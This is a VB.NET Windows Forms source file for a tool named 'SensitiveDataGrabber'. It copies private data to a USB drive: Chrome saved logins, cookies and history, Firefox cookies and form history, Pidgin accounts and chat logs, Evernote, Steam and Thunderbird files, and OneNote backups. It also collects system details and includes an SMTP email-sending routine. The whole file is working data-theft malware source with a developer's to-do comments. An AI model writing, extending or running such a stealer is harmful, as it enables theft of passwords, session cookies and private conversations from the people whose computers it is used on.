Imports System.IO
Imports Microsoft.Win32
Imports System.Net.Mail
Imports System.Environment
Imports System.Management
Imports Microsoft.VisualBasic.FileIO

Public Class MainForm

    ' email variables
    Dim emailCredentials As New emailCredentials
    Dim emailSMTPServer As String
    Dim emailSMTPPort As Integer
    Dim emailSenderEmail As String
    Dim emailSenderPassword As String
    Dim emailReciever As String
    Dim emailDefaultSubject As String

    Dim driveLetter As String
    Dim defaultBrowser As String
    Dim username As String = Environment.UserName

    Dim firefoxDirectory As String = "C:\Users\" & username & "\AppData\Roaming\Mozilla\Firefox\Profiles\"
    Dim thunderbirdDirectory As String = "C:\Users\" & username & "\AppData\Roaming\Thunderbird\Profiles\"
    Dim softwareName As String
    Dim chromeDirectory As String = "C:\Users\" & username & "\AppData\Local\Google\Chrome\User Data\Default"
    Dim evernoteDirectory As String = "C:\Users\" & username & "\AppData\Local\Evernote\Evernote\Databases"
    Dim pidginDirectory As String = "C:\Users\" & username & "\AppData\Roaming\.purple\"
    Dim oneNoteDirectory As String = "C:\Users\" & username & "\AppData\Local\Microsoft\OneNote\15.0\Backup\"
    Dim steamDirectory As String = "C:\Program Files (x86)\Steam\config\"
    Dim WoTDirectory As String = "C:\Users\" & username & "\AppData\Roaming\Wargaming.net\WorldofTanks"

    Private Function checkIfInstalled(ByVal software As String) As String
        Dim path As String = Nothing

        Select Case software
            Case "Chrome"
                path = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
            Case "Evernote"
                path = "C:\Program Files (x86)\Evernote\Evernote\Evernote.exe"
            Case "Firefox"
                path = "C:\Program Files (x86)\Mozilla Firefox\firefox.exe"
            Case "OneNote"

            Case "Pidgin"
                path = "C:\Program Files (x86)\Pidgin\pidgin.exe"
            Case "Steam"
                path = "C:\Program Files (x86)\Steam\Steam.exe"
            Case "Thunderbird"
                path = "C:\Program Files (x86)\Mozilla Thunderbird\thunderbird.exe"
            Case "World of Tanks"
                path = "C:\Games\World_of_Tanks\WorldOfTanks.exe"
        End Select

        If File.Exists(path) Then
            Return "Yes"
        Else
            Return "No"
        End If
        Return Nothing
    End Function
    Private Function getUSBLetter()
        For Each d As System.IO.DriveInfo In My.Computer.FileSystem.Drives
            If d.DriveType = DriveType.Removable Then
                driveLetter = d.Name
            End If
        Next
        If Not Directory.Exists(driveLetter & "SensitiveDataGrabber") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber")
        Return Nothing
    End Function

    Private Function getBasicInfo()
        If Not File.Exists(driveLetter & "SensitiveDataGrabber\basicinfo.txt") Then File.Create(driveLetter & "SensitiveDataGrabber\basicinfo.txt")

        ' Basic info
        Dim getMachineName As String = Environment.MachineName
        Dim getUserName As String = Environment.UserName
        Dim getDomainName As String = Environment.UserDomainName
        Dim getBits As String = Environment.Is64BitOperatingSystem.ToString
        Dim getNoOfProcessors As String = Environment.ProcessorCount

        ' OS version
        Dim OSMajor As String = Environment.OSVersion.Version.Major.ToString
        Dim OSMinor As String = Environment.OSVersion.Version.Minor.ToString

        Dim getOSVersion As String = String.Empty

        If OSMajor = 5 And OSMinor = 0 Then getOSVersion = "Windows 2000"
        If OSMajor = 5 And OSMinor = 1 Then getOSVersion = "Windows XP (x86)"
        If OSMajor = 5 And OSMinor = 2 Then getOSVersion = "Windows XP (x64)"
        If OSMajor = 6 And OSMinor = 0 Then getOSVersion = "Windows Vista"
        If OSMajor = 6 And OSMinor = 1 Then getOSVersion = "Windows 7"
        If OSMajor = 6 And OSMinor = 2 Then getOSVersion = "Windows 8"
        If OSMajor = 6 And OSMinor = 3 Then getOSVersion = "Windows 8.1"

        ' Memory
        Dim getTotalPhysicalMemory As String = System.Math.Round(My.Computer.Info.TotalPhysicalMemory / (1024 * 1024), 2).ToString
        Dim getAvailablePhysicalMemory As String = System.Math.Round(My.Computer.Info.AvailablePhysicalMemory / (1024 * 1024), 2).ToString
        Dim getTotalVirtualMemory As String = System.Math.Round(My.Computer.Info.TotalVirtualMemory / (1024 * 1024), 2).ToString
        Dim getAvailableVirtualMemory As String = System.Math.Round(My.Computer.Info.AvailableVirtualMemory / (1024 * 1024), 2).ToString

        Using sw As StreamWriter = New StreamWriter(driveLetter & "SensitiveDataGrabber\basicinfo.txt")
            sw.Write("OS: " & getOSVersion & vbCrLf)
            sw.Write("Username: " & getUserName & vbCrLf)
            sw.Write("Number of processors: " & getNoOfProcessors & vbCrLf)
            sw.Write("Is system 64bit? " & getBits & vbCrLf)
            sw.Write("Domain name: " & getDomainName & vbCrLf)
            sw.Write("Machine name: " & getMachineName & vbCrLf)
            sw.Write(vbCrLf)
            sw.Write("Total physical memory: " & getTotalPhysicalMemory & vbCrLf)
            sw.Write("Available physical memory: " & getAvailablePhysicalMemory & vbCrLf)
            sw.Write("Total virtual memory: " & getTotalVirtualMemory & vbCrLf)
            sw.Write("Available virtual memory: " & getAvailableVirtualMemory & vbCrLf)
        End Using

        Return Nothing
    End Function

    Private Function getChrome()
        If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Chrome") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Chrome")
        File.Copy(chromeDirectory & "\Bookmarks", driveLetter & "SensitiveDataGrabber\Chrome\bookmarks.txt", True)
        File.Copy(chromeDirectory & "\Cookies", driveLetter & "SensitiveDataGrabber\Chrome\cookies.sqlite", True)
        File.Copy(chromeDirectory & "\History", driveLetter & "SensitiveDataGrabber\Chrome\history.sqlite", True)
        File.Copy(chromeDirectory & "\Login Data", driveLetter & "SensitiveDataGrabber\Chrome\loginData.sqlite", True)
        File.Copy(chromeDirectory & "\Web Data", driveLetter & "SensitiveDataGrabber\Chrome\webdata.sqlite", True)
        Return Nothing
    End Function

    Private Function getEvernote()
        If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Evernote") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Evernote")
        File.Copy(evernoteDirectory & "\.accounts", driveLetter & "SensitiveDataGrabber\Evernote\accountinfo.txt", True)
        ' Trebaće mi korisničko ime.
        ' Korisničko ime se nalazi unutar .accounts fajla.
        ' Završava se sa znakom ;
        Return Nothing
    End Function

    Private Function getFirefox()
        If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Firefox") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Firefox")
        File.Copy(firefoxDirectory & "cookies.sqlite", driveLetter & "SensitiveDataGrabber\Firefox\cookies.sqlite", True)
        File.Copy(firefoxDirectory & "addons.json", driveLetter & "SensitiveDataGrabber\Firefox\addons.txt", True)
        'File.Copy(firefoxDirectory & "downloads.json", driveLetter & "SensitiveDataGrabber\Firefox\downloads.txt", True)
        File.Copy(firefoxDirectory & "formhistory.sqlite", driveLetter & "SensitiveDataGrabber\Firefox\formhistory.sqlite", True)
        Return Nothing
    End Function

    Private Function getPidgin()
        If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Pidgin") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Pidgin")
        File.Copy(pidginDirectory & "accounts.xml", driveLetter & "SensitiveDataGrabber\Pidgin\accounts.xml", True)
        My.Computer.FileSystem.CopyDirectory(pidginDirectory & "logs", driveLetter & "SensitiveDataGrabber\Pidgin\logs")
        Return Nothing
    End Function

    Private Function getOneNote()
        If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\OneNote") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\OneNote")
        My.Computer.FileSystem.CopyDirectory(oneNoteDirectory, driveLetter & "SensitiveDataGrabber\OneNote\", True)
        Return Nothing
    End Function

    Private Function getSteam()
        If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Steam") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Steam")
        File.Copy(steamDirectory & "config.vdf", driveLetter & "SensitiveDataGrabber\Steam\config.txt", True)
        Return Nothing
    End Function

    Private Function getThunderbird()
        If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Thunderbird") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Thunderbird")
        File.Copy(thunderbirdDirectory & "abook.mab", driveLetter & "SensitiveDataGrabber\Thunderbird\addressbook.mab", True)
        File.Copy(thunderbirdDirectory & "addons.sqlite", driveLetter & "SensitiveDataGrabber\Thunderbird\addons.sqlite", True)
        File.Copy(thunderbirdDirectory & "cookies.sqlite", driveLetter & "SensitiveDataGrabber\Thunderbird\cookies.sqlite", True)
        Return Nothing
    End Function

    Private Function getWoT()
        If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\WoT") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\WoT")
        File.Copy(WoTDirectory & "\preferences.xml", driveLetter & "SensitiveDataGrabber\WoT\preferences.xml", True)
        My.Computer.FileSystem.CopyDirectory(WoTDirectory & "\battle_results", driveLetter & "SensitiveDataGrabber\WoT\battle_results", True)
        ' Nema osjetljivih podataka unutar World of Tanks foldera.
        ' Iz preferences se može izvući korisničko ime.
        ' Pored toga, mislim da nema ništa bitno u folderu osim rezultata bitaka.
        Return Nothing
    End Function


    Private Function getDefaultBrowser() As String
        Dim retVal As String = String.Empty
        Using baseKey As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.OpenSubKey("Software\Clients\StartmenuInternet")
            Dim baseName As String = baseKey.GetValue("").ToString
            Dim subKey As String = "SOFTWARE\" & IIf(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE") = "AMD64", "Wow6432Node\", "") & "Clients\StartMenuInternet\" & baseName
            Using browserKey As Microsoft.Win32.RegistryKey = My.Computer.Registry.LocalMachine.OpenSubKey(subKey)
                retVal = browserKey.GetValue("").ToString
            End Using
        End Using
        Return retVal
    End Function

    Private Function getFirefoxDirectory() As String
        Dim result As String = String.Empty
        Dim folder() As String = Directory.GetDirectories(firefoxDirectory)
        result = folder(0)
        result = result & "\"
        Return result
    End Function

    Private Function getThunderbirdDirectory() As String
        Dim result As String = String.Empty
        Dim folder() As String = Directory.GetDirectories(thunderbirdDirectory)
        result = folder(0)
        result = result & "\"
        Return result
    End Function

    Private Function sendMail()
        Try
            Dim Smtp_Server As New SmtpClient
            Dim mail As New MailMessage()
            Smtp_Server.UseDefaultCredentials = False
            Smtp_Server.Credentials = New Net.NetworkCredential(emailSenderEmail, emailSenderPassword)
            Smtp_Server.Host = emailSMTPServer
            Smtp_Server.Port = emailSMTPPort
            Smtp_Server.EnableSsl = True

            mail = New MailMessage()
            mail.From = New MailAddress(emailSenderEmail)
            mail.To.Add(emailReciever)
            mail.Subject = emailDefaultSubject
            mail.IsBodyHtml = False
            mail.Body = username
            Smtp_Server.Send(mail)

            MessageBox.Show("Email sent!")

        Catch error_t As Exception
            MsgBox(error_t.ToString)
        End Try

        Return Nothing
    End Function

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        RadioButton1.Enabled = True
        RadioButton1.Checked = True
        RadioButton2.Enabled = False
        RadioButton3.Enabled = False
        GroupBox2.Enabled = False

        getUSBLetter()
        defaultBrowser = getDefaultBrowser()
    End Sub


    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        If RadioButton1.Checked = True Then
            If chkFirefox.Checked = True Then
                firefoxDirectory = getFirefoxDirectory()
                getFirefox()
                Button1.Enabled = False
            End If

            If chkPidgin.Checked = True Then
                Button1.Enabled = False
                getPidgin()
                Button1.Enabled = True
            End If

            If chkEvernote.Checked = True Then
                Button1.Enabled = False
                getEvernote()
                Button1.Enabled = True
            End If

            If chkWoT.Checked = True Then
                Button1.Enabled = False
                getWoT()
                Button1.Enabled = True
            End If

            If chkThunderbird.Checked = True Then
                thunderbirdDirectory = getThunderbirdDirectory()
                Button1.Enabled = False
                getThunderbird()
                Button1.Enabled = True
            End If

            If chkChrome.Checked = True Then
                Button1.Enabled = False
                getChrome()
                Button1.Enabled = True
            End If

            If chkSteam.Checked = True Then
                Button1.Enabled = False
                getSteam()
                Button1.Enabled = True
            End If

            If chkOneNote.Checked = True Then
                Button1.Enabled = False
                getOneNote()
                Button1.Enabled = True
            End If

        ElseIf RadioButton2.Checked = True Then
            MessageBox.Show(emailSMTPServer & vbCrLf & emailSMTPPort & vbCrLf & emailSenderEmail & vbCrLf &
                         emailSenderPassword & vbCrLf & emailReciever & vbCrLf & emailDefaultSubject)
            sendMail()
        ElseIf RadioButton3.Checked = True Then

        Else

        End If


        
      
    End Sub

    ' ============================================================================================
    ' ================ URADITI ================ URADITI =============== URADITI ==================
    ' ============================================================================================
    ' ======= Ispraviti tako da prepoznava da li je instaliran program koristeći registar. =======
    ' ======= Testirati program u virtuelnoj mašini.                                       =======
    ' ============================================================================================
    ' ============================================================================================

    Private Sub ChangeEmailCredentialsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ChangeEmailCredentialsToolStripMenuItem.Click
        emailCredentials.ShowDialog()

        If emailCredentials.DialogResult = Windows.Forms.DialogResult.OK Then

            If emailCredentials.TextBox1.Text <> Nothing Then emailSMTPServer = emailCredentials.TextBox1.Text
            If emailCredentials.TextBox2.Text <> Nothing Then emailSMTPPort = emailCredentials.TextBox2.Text
            If emailCredentials.TextBox3.Text <> Nothing Then emailSenderEmail = emailCredentials.TextBox3.Text
            If emailCredentials.TextBox4.Text <> Nothing Then emailSenderPassword = emailCredentials.TextBox4.Text
            If emailCredentials.TextBox5.Text <> Nothing Then emailReciever = emailCredentials.TextBox5.Text
            If emailCredentials.TextBox6.Text <> Nothing Then emailDefaultSubject = emailCredentials.TextBox6.Text

            RadioButton2.Enabled = True
        ElseIf emailCredentials.DialogResult = Windows.Forms.DialogResult.Cancel Then

        Else
            MessageBox.Show("There's been a critical error. Please try again", "Critical Error!", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If

    End Sub


End Class
